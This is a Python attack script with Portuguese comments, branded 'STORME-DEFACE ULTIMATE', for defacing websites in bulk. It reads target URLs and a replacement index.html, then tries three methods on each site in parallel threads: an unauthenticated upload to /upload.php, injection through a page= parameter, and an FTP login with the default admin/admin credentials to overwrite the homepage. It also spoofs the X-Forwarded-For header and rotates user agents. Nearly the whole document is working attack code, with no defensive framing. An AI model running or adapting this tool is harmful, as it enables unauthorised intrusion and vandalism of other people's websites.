#!/usr/bin/python3
# -*- coding: utf-8 -*-
# STORME-DEFACE ULTIMATE | @18shinstorme | KEY: stormeshin18

import os
import sys
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor

# ===== CONFIGURAÇÕES =====
MAX_THREADS = 3  # Evita bloqueio por flood
TIMEOUT = 10     # Timeout para cada requisição
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# ===== CORES =====
class Cores:
    VERMELHO = "\033[31m"
    VERDE = "\033[32m"
    AMARELO = "\033[33m"
    AZUL = "\033[34m"
    RESET = "\033[0m"
    NEGRITO = "\033[1m"

# ===== BANNER =====
BANNER = f"""
{Cores.AZUL}
             ___
           /  >  フ   
          /   _  _|    {Cores.NEGRITO}Author: @18shinstorme{Cores.RESET}
        /`   ミ_x/      {Cores.NEGRITO}Version: STORME-DEFACE ULTIMATE{Cores.RESET}
     _//        |       {Cores.NEGRITO}Key: stormeshin18{Cores.RESET}
    /  ヽ       ﾉ       {Cores.NEGRITO}Date: {time.strftime("%Y-%m-%d")}{Cores.RESET}
    │     | | |
  /￣\\   | | |  
  | (￣ヽ＿ヽ)_)
   ＼二つ
{Cores.RESET}
"""

def carregar_payload(arquivo):
    """Carrega o HTML de deface"""
    with open(arquivo, 'r', encoding='utf-8') as f:
        return f.read()

def testar_vulnerabilidade(url):
    """Testa se o site é vulnerável"""
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        resposta = requests.get(url, headers=headers, timeout=TIMEOUT)
        
        # Verifica se permite upload ou tem painel admin
        if "wp-admin" in resposta.text or "upload" in resposta.text:
            return True
        return False
    except:
        return False

def atacar_site(site, payload):
    """Tenta 3 métodos diferentes de deface"""
    site = site.strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': '127.0.0.1'
    }
    
    # Método 1: Tentativa via POST (para formulários)
    try:
        resposta = requests.post(
            f"{site}/upload.php",
            files={'file': ('index.html', payload)},
            headers=headers,
            timeout=TIMEOUT
        )
        if resposta.status_code == 200:
            return True
    except:
        pass
    
    # Método 2: Tentativa via GET (para LFI/RFI)
    try:
        resposta = requests.get(
            f"{site}/vulneravel.php?page={payload}",
            headers=headers,
            timeout=TIMEOUT
        )
        if "HACKED" in resposta.text:
            return True
    except:
        pass
    
    # Método 3: Backup via FTP (se houver credenciais)
    try:
        from ftplib import FTP
        ftp = FTP(site.split('//')[1])
        ftp.login(user='admin', passwd='admin')
        ftp.storbinary('STOR index.html', payload.encode())
        ftp.quit()
        return True
    except:
        return False

def main():
    print(BANNER)
    
    # Verifica arquivos
    if not os.path.isfile('targets.txt'):
        print(f"{Cores.VERMELHO}[!] Arquivo targets.txt não encontrado!{Cores.RESET}")
        return
    
    if not os.path.isfile('index.html'):
        print(f"{Cores.VERMELHO}[!] Arquivo index.html não encontrado!{Cores.RESET}")
        return
    
    payload = carregar_payload('index.html')
    with open('targets.txt', 'r') as f:
        sites = [linha.strip() for linha in f if linha.strip()]
    
    print(f"{Cores.AMARELO}[*] Iniciando ataque contra {len(sites)} alvos...{Cores.RESET}")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        resultados = list(executor.map(
            lambda site: (site, atacar_site(site, payload)),
            sites
        ))
    
    # Exibe resultados
    print(f"\n{Cores.NEGRITO}=== RESULTADOS ===")
    for site, sucesso in resultados:
        if sucesso:
            print(f"{Cores.VERDE}[+] {site} -> DEFACED!{Cores.RESET}")
        else:
            print(f"{Cores.VERMELHO}[-] {site} -> FALHOU{Cores.RESET}")
    
    print(f"\n{Cores.AZUL}[*] Concluído! Verifique os sites manualmente.{Cores.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Cores.VERMELHO}[!] Interrompido pelo usuário.{Cores.RESET}")
    except Exception as e:
        print(f"\n{Cores.VERMELHO}[ERRO] {str(e)}{Cores.RESET}")
